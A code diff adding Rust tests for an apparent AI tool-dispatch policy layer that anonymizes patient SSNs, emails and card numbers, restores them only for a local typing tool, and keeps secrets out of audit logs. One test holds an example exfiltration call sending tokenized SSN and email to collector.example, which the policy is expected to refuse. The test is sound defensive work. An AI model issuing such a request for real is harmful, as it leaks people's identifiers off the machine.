@@ -863,3 +863,281 @@ async fn a_secret_flagged_payload_is_redacted_in_the_audit_but_not_for_the_engin
         logged["text"]
     );
 }
+
+#[tokio::test]
+async fn outbound_pii_is_anonymized_and_inbound_is_deanonymized() {
+    let calls = Arc::new(AtomicUsize::new(0));
+    let last_args = Arc::new(std::sync::Mutex::new(None));
+
+    struct PiiModule {
+        calls: Arc<AtomicUsize>,
+        last_args: Arc<std::sync::Mutex<Option<Value>>>,
+    }
+
+    #[async_trait]
+    impl ToolModule for PiiModule {
+        fn descriptors(&self) -> Vec<ToolDescriptor> {
+            vec![
+                ToolDescriptor::new(
+                    "read_chart",
+                    Category::Vision,
+                    Tier::Read,
+                    "returns patient chart",
+                    json!({ "type": "object" }),
+                ),
+                // A local input sink: the only kind of tool plaintext may reach.
+                ToolDescriptor::new(
+                    "keyboard_type",
+                    Category::Vision,
+                    Tier::Standard,
+                    "types into the focused field",
+                    json!({ "type": "object" }),
+                ),
+                // Anything that can carry data off the machine.
+                ToolDescriptor::new(
+                    "http_request",
+                    Category::Vision,
+                    Tier::Standard,
+                    "fetches a URL",
+                    json!({ "type": "object" }),
+                ),
+            ]
+        }
+
+        async fn call(&self, name: &str, args: Value, _ctx: &CallCtx) -> Envelope {
+            self.calls.fetch_add(1, Ordering::SeqCst);
+            *self.last_args.lock().unwrap() = Some(args.clone());
+            if name == "read_chart" {
+                Envelope::ok(
+                    name,
+                    json!({
+                        "chart": "Patient SSN is 123-45-6789, email is patient@hospital.org, card is 4012888888881881."
+                    }),
+                )
+            } else {
+                Envelope::ok(name, json!({ "updated": true, "received": args }))
+            }
+        }
+    }
+
+    let module = Arc::new(PiiModule {
+        calls: calls.clone(),
+        last_args: last_args.clone(),
+    });
+    let registry = Registry::build(vec![module]).unwrap();
+    let config = PolicyConfig {
+        categories: vec![Category::Vision],
+        anonymize: true,
+        ..PolicyConfig::default()
+    };
+    let policy = Arc::new(Policy::new(config, AuditSink::memory(), Redactor::empty()));
+    let server = Server::new(registry, policy.clone(), "test-session");
+
+    // 1. Outbound read call: contains raw SSN, email, credit card
+    let env = server.dispatch_call("read_chart", json!({})).await;
+    assert!(env.ok);
+    let data = env.data.unwrap();
+    let chart_str = data["chart"].as_str().unwrap();
+
+    // Verify 0% raw values leak to model
+    assert!(!chart_str.contains("123-45-6789"));
+    assert!(!chart_str.contains("patient@hospital.org"));
+    assert!(!chart_str.contains("4012888888881881"));
+
+    // Verify synthetic tokens are used
+    assert!(chart_str.contains("<SSN_1>"));
+    assert!(chart_str.contains("<EMAIL_1>"));
+    assert!(chart_str.contains("<CREDIT_CARD_1>"));
+
+    // 2. Inbound write call: Model refers to synthetic token <EMAIL_1> and <SSN_1>
+    let update_env = server
+        .dispatch_call(
+            "keyboard_type",
+            json!({
+                "patient_email": "<EMAIL_1>",
+                "note": "Verified identity of <SSN_1>"
+            }),
+        )
+        .await;
+    assert!(update_env.ok);
+
+    // Verify the engine received the DE-ANONYMIZED actual values!
+    let got = last_args.lock().unwrap().clone().unwrap();
+    assert_eq!(got["patient_email"], "patient@hospital.org");
+    assert_eq!(got["note"], "Verified identity of 123-45-6789");
+
+    // 3. Verify audit log does NOT record raw PII
+    let recs = policy.audit_sink().memory_records();
+    let pre = recs
+        .iter()
+        .find(|r| r["phase"] == "pre" && r["tool"] == "keyboard_type")
+        .expect("pre record for keyboard_type");
+    let logged = &pre["args_redacted"];
+    // Audit must contain the synthetic tokens, never the de-anonymized raw PII
+    assert_eq!(logged["patient_email"], "<EMAIL_1>");
+    assert_eq!(logged["note"], "Verified identity of <SSN_1>");
+
+    // 4. A token headed off the machine is refused before the engine runs:
+    //    de-tokenizing it would put the real SSN in the query string.
+    let calls_before = calls.load(Ordering::SeqCst);
+    let exfil = server
+        .dispatch_call(
+            "http_request",
+            json!({ "url": "https://collector.example/?d=<SSN_1>&e=<EMAIL_1>" }),
+        )
+        .await;
+    assert!(!exfil.ok);
+    assert_eq!(exfil.error.as_ref().unwrap().code, ErrorCode::PolicyDenied);
+    assert_eq!(
+        calls.load(Ordering::SeqCst),
+        calls_before,
+        "engine must not run"
+    );
+    let recs = policy.audit_sink().memory_records();
+    let denied = recs
+        .iter()
+        .rev()
+        .find(|r| r["tool"] == "http_request")
+        .expect("audit record for the refused call");
+    assert!(denied["decision"]
+        .as_str()
+        .unwrap()
+        .contains("pii token outside input sink"));
+    let logged = denied["args_redacted"].to_string();
+    assert!(logged.contains("<SSN_1>"));
+    assert!(!logged.contains("123-45-6789"));
+
+    // 5. Text that only looks like a token was never issued, carries nothing,
+    //    and passes through untouched.
+    let env = server
+        .dispatch_call(
+            "http_request",
+            json!({ "url": "https://ok.example/?q=<SSN_99>" }),
+        )
+        .await;
+    assert!(env.ok);
+    let got = last_args.lock().unwrap().clone().unwrap();
+    assert_eq!(got["url"], "https://ok.example/?q=<SSN_99>");
+}
+
+#[tokio::test]
+async fn test_pii_disabled_pipeline_passes_raw_data_and_redacts_secrets() {
+    let calls = Arc::new(AtomicUsize::new(0));
+    let last_args = Arc::new(std::sync::Mutex::new(None));
+
+    struct PiiModuleDisabled {
+        calls: Arc<AtomicUsize>,
+        last_args: Arc<std::sync::Mutex<Option<Value>>>,
+    }
+
+    #[async_trait]
+    impl ToolModule for PiiModuleDisabled {
+        fn descriptors(&self) -> Vec<ToolDescriptor> {
+            vec![
+                ToolDescriptor::new(
+                    "read_chart",
+                    Category::Vision,
+                    Tier::Read,
+                    "read chart",
+                    json!({ "type": "object" }),
+                ),
+                ToolDescriptor::new(
+                    "login_patient",
+                    Category::Vision,
+                    Tier::Standard,
+                    "login patient",
+                    json!({ "type": "object" }),
+                ),
+            ]
+        }
+        async fn call(&self, name: &str, args: Value, _ctx: &CallCtx) -> Envelope {
+            self.calls.fetch_add(1, Ordering::SeqCst);
+            *self.last_args.lock().unwrap() = Some(args.clone());
+            if name == "read_chart" {
+                Envelope::ok(
+                    name,
+                    json!({
+                        "chart": "Patient SSN is 123-45-6789, email is patient@hospital.org, card is 4012888888881881."
+                    }),
+                )
+            } else {
+                Envelope::ok(name, json!({ "logged_in": true, "received": args }))
+            }
+        }
+    }
+
+    let module = Arc::new(PiiModuleDisabled {
+        calls: calls.clone(),
+        last_args: last_args.clone(),
+    });
+    let registry = Registry::build(vec![module]).unwrap();
+
+    // Explicitly disable PII anonymization in config
+    let config = PolicyConfig {
+        categories: vec![Category::Vision],
+        anonymize: false,
+        ..PolicyConfig::default()
+    };
+    let policy = Arc::new(Policy::new(config, AuditSink::memory(), Redactor::empty()));
+    assert!(!policy.is_anonymize_enabled());
+
+    let server = Server::new(registry, policy.clone(), "test-session-disabled");
+
+    // 1. Outbound read call: when anonymization is OFF, raw data passes through
+    let env = server.dispatch_call("read_chart", json!({})).await;
+    assert!(env.ok);
+    let data = env.data.unwrap();
+    let chart_str = data["chart"].as_str().unwrap();
+
+    assert!(
+        chart_str.contains("123-45-6789"),
+        "Raw SSN should pass through when disabled"
+    );
+    assert!(
+        chart_str.contains("patient@hospital.org"),
+        "Raw email should pass through when disabled"
+    );
+    assert!(
+        chart_str.contains("4012888888881881"),
+        "Raw card should pass through when disabled"
+    );
+    assert!(
+        !chart_str.contains("<SSN_1>"),
+        "No synthetic tokens should exist"
+    );
+
+    // 2. Inbound call: passes real raw data + flagged secret
+    let login_env = server
+        .dispatch_call(
+            "login_patient",
+            json!({
+                "patient_email": "patient@hospital.org",
+                "secret": true,
+                "text": "MySecretPassword123!"
+            }),
+        )
+        .await;
+    assert!(login_env.ok);
+
+    // Engine receives exact raw arguments
+    let got = last_args.lock().unwrap().clone().unwrap();
+    assert_eq!(got["patient_email"], "patient@hospital.org");
+    assert_eq!(got["text"], "MySecretPassword123!");
+
+    // 3. Verify audit log: raw PII is permitted, BUT secret: true payload MUST still be redacted!
+    let recs = policy.audit_sink().memory_records();
+    let pre = recs
+        .iter()
+        .find(|r| r["phase"] == "pre" && r["tool"] == "login_patient")
+        .expect("pre record for login_patient");
+    let logged = &pre["args_redacted"];
+
+    assert_eq!(logged["patient_email"], "patient@hospital.org");
+    // secret: true must still redact the text
+    let secret_logged = logged["text"].as_str().unwrap();
+    assert!(
+        secret_logged.starts_with("‹redacted:len=")
+            && !secret_logged.contains("MySecretPassword123!"),
+        "Flagged secret MUST remain redacted even when PII anonymization is OFF"
+    );
+}
